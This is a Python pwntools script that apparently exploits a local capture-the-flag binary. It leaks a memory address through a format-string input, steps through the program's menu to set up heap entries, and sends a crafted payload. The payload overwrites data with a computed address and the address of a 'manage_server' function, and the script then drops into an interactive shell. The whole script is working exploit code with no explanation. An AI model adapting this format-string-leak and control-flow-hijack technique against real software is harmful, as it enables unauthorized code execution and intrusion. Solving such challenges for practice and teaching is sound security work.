#!/usr/bin/env python3
from pwn import *

sh = process("./challenge")

elf = ELF('./challenge')

sh.recvline().decode()
sh.sendline(b"%2$x")
response = sh.recv()
leak = int(response.decode().split("C")[0], 16)

response.decode()
sh.sendline(b"2")
sh.sendline(b"random")

sh.recv().decode()
sh.sendline(b"2")
sh.recv().decode()
sh.sendline(b"/bin/bash")

sh.recv().decode()
sh.sendline(b"2")
sh.recv().decode()
sh.sendline(b"oldone")

sh.recv().decode()
sh.sendline(b"3")
sh.recv().decode()
sh.sendline(b"random")

sh.recv().decode()
sh.sendline(b"2")
sh.recv().decode()

# Craft payload
payload = b"A"*(4*6) # offset
payload += b"\x21"
payload += b"\x00"*7
payload += p64(leak + 0x14C0)
payload += p64(elf.functions['manage_server'].address)

sh.sendline(payload)

sh.recv().decode()
sh.sendline(b"4")
sh.recv().decode()

sh.interactive()